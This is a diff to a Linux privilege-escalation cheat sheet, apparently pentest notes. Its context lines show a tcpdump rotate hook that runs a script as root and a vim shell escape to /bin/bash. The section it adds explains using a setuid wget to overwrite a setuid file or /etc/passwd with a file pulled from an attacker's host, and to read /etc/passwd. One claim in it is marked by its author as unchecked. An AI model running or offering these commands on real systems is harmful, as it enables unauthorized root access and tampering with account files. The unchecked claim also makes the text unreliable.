@@ -97,6 +97,15 @@ tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
 :py os.system("/bin/bash")
 ```
 
+#### wget
+
+Any file that is overwritten by wget will maintain it's permissions \(double-check this\), so it's generally a good idea to overwrite either a setuid file that is not key for the machine to continue execution, or to overwrite something like `/etc/passwd`
+
+```text
+wget <ip>:<file> -O setuid_file
+wget -i /etc/passwd
+```
+
 #### References
 
 [https://stackoverflow.com/questions/46897570/why-do-files-in-proc-self-end-up-being-owned-by-root-if-a-program-has-its-setui](https://stackoverflow.com/questions/46897570/why-do-files-in-proc-self-end-up-being-owned-by-root-if-a-program-has-its-setui)
